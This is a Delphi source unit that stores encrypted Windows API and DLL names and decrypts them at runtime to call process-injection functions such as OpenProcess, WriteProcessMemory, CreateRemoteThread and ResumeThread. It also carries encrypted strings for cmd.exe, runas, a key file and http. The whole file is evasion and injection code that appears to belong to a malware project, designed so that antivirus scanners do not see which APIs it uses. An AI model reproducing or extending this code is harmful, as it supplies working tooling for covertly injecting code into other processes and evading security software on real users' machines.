unit WrapFunc;

interface

uses
  Windows;

const
  fnc_WriteProcessMemory =
     #70#75#146#81#189#201#139#137#157#181#44#104#230#217#16#217#161#56;
  fnc_CreateRemoteThread =
     #82#204#94#16#189#110#66#234#152#113#156#29#209#158#170#240#230#46;
  fnc_ResumeThread =
     #67#253#222#183#155#39#175#174#30#181#151#235;
  fnc_LoadLibraryA =
     #93#214#64#124#94#252#92#80#224#110#47#62;
  fnc_LoadLibraryW =
     #93#214#64#124#94#252#92#80#224#110#47#40;
  fnc_OpenProcess =
     #94#52#160#75#175#22#101#215#88#71#254;
  fnc_CreateProcessW =
     #82#204#94#16#189#110#64#11#6#163#45#210#169#5;
  fnc_VirtualAllocEx =
     #71#173#153#56#104#29#114#141#1#204#235#86#27#168;
  fnc_VirtualFreeEx =
     #71#173#153#56#104#29#114#138#190#41#210#7#179;
  fnc_ShellExecuteExW =
     #66#100#191#87#162#135#55#130#239#199#88#157#119#171#173;
  fnc_CoCreateInstance =
     #82#209#177#131#172#66#212#61#166#7#250#250#222#42#64#255;
  fnc_MessageBoxW =
     #92#75#153#58#55#48#244#110#129#127#114;
  fnc_F5 =
     #87#67;

  dll_shell32 =
     #98#24#32#134#234#127#243#194#228#79#48;
  dll_kernel32 =
     #122#30#160#227#96#116#47#188#201#66#125#253;
  dll_msimg32 =
     #124#226#216#195#176#198#11#185#179#82#53;
  dll_user32 =
     #100#244#74#203#143#3#177#89#244#37;
  dll_ole32 =
     #126#196#218#33#205#218#81#90#228;
  dll_mpkf =
     #124#225#77#16#77#0#162#179;

  str_cmdtmp = 
     #114#79#97#201#233#22#102;
  str_dottmp =
     #63#31#63#39;
  str_cmdexe =
     #114#79#97#201#248#217#88;
  str_mpkexe =
     #124#225#77#88#225#200#145;
  str_ctrlaltshift =
     #82#234#218#125#27#174#232#104#95#15#235#252#184#165#121#136;
  str_runas =
     #99#142#125#1#80;
  str_keybin =
     #122#30#171#169#149#218#165;
  str_http =
     #121#132#230#141#94#238#234;     
    

  function DecStr(const AStr: string): string;

  function _WriteProcessMemory(hProcess: THandle; const lpBaseAddress: Pointer; lpBuffer: Pointer;
                               nSize: DWORD; var lpNumberOfBytesWritten: DWORD): BOOL;
  function _CreateRemoteThread(hProcess: THandle; lpThreadAttributes: Pointer;
                               dwStackSize: DWORD; lpStartAddress: TFNThreadStartRoutine;
                               lpParameter: Pointer; dwCreationFlags: DWORD;
                               var lpThreadId: DWORD): THandle;
  function _ResumeThread(hThread: THandle): DWORD;

  function _OpenProcess(dwDesiredAccess: DWORD; bInheritHandle: BOOL;
                        dwProcessId: DWORD): THandle; 

  function _GetProcAddress(const ModuleName, FuncName: string): FARPROC;


implementation

uses
  GlobalVar, Crypto;

{++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++}
function DecStr(const AStr: string): string;
begin
  Result := Decrypt(AStr, gK1, gK2, gK3);
end;

{++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++}
function _GetProcAddress(const ModuleName, FuncName: string): FARPROC;
begin
  Result := GetProcAddress(GetModuleHandle(PChar(DecStr(ModuleName))),
                          PChar(DecStr(FuncName)));
end;

{++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++}
function _WriteProcessMemory(hProcess: THandle; const lpBaseAddress: Pointer; lpBuffer: Pointer;
                             nSize: DWORD; var lpNumberOfBytesWritten: DWORD): BOOL;
var
  pWriteProcessMemory: function(hProcess: THandle; const lpBaseAddress: Pointer; lpBuffer: Pointer;
                                nSize: DWORD; var lpNumberOfBytesWritten: DWORD): BOOL; stdcall;
begin
  Result := False;

  pWriteProcessMemory := _GetProcAddress(dll_kernel32, fnc_WriteProcessMemory);
  if Assigned(pWriteProcessMemory) then
     Result := pWriteProcessMemory(hProcess, lpBaseAddress, lpBuffer,
                                   nSize, lpNumberOfBytesWritten);
end;

{++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++}
function _CreateRemoteThread(hProcess: THandle; lpThreadAttributes: Pointer;
                             dwStackSize: DWORD; lpStartAddress: TFNThreadStartRoutine;
                             lpParameter: Pointer; dwCreationFlags: DWORD;
                             var lpThreadId: DWORD): THandle;
var
  pCreateRemoteThread: function(hProcess: THandle; lpThreadAttributes: Pointer;
                                dwStackSize: DWORD; lpStartAddress: TFNThreadStartRoutine;
                                lpParameter: Pointer; dwCreationFlags: DWORD;
                                var lpThreadId: DWORD): THandle; stdcall;
begin
  Result := 0;

  pCreateRemoteThread := _GetProcAddress(dll_kernel32, fnc_CreateRemoteThread);
  if Assigned(pCreateRemoteThread) then
     Result := pCreateRemoteThread(hProcess, lpThreadAttributes, dwStackSize, lpStartAddress,
                                   lpParameter, dwCreationFlags, lpThreadId);
end;

{++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++}
function _ResumeThread(hThread: THandle): DWORD;
var
  pResumeThread: function(hThread: THandle): DWORD; stdcall;
begin
  Result := DWORD(-1);

  pResumeThread := _GetProcAddress(dll_kernel32, fnc_ResumeThread);
  if Assigned(pResumeThread) then
     Result := pResumeThread(hThread);
end;

{++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++}
function _OpenProcess(dwDesiredAccess: DWORD; bInheritHandle: BOOL;
                      dwProcessId: DWORD): THandle;
var
  pOpenProcess: function(dwDesiredAccess: DWORD; bInheritHandle: BOOL;
                         dwProcessId: DWORD): THandle; stdcall;
begin
  Result := 0;

  pOpenProcess := _GetProcAddress(dll_kernel32, fnc_OpenProcess);
  if Assigned(pOpenProcess) then
     Result := pOpenProcess(dwDesiredAccess, bInheritHandle, dwProcessId);
end;


end.
